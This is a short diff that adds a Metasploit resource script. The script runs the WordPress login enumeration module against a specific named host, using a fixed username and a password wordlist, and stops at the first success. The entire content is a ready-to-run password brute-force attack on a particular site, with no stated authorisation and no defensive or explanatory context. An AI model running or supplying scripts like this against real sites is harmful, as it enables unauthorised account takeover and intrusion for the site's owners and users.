@@ -1,0 +1,6 @@
+use scanner/http/wordpress_login_enum
+set RHOSTS https://rs11.glorifykickstarter.com
+set USERNAME cybersecurity
+set PASS_FILE passwd/pw_list2.txt
+set STOP_ON_SUCCESS true
+exploit
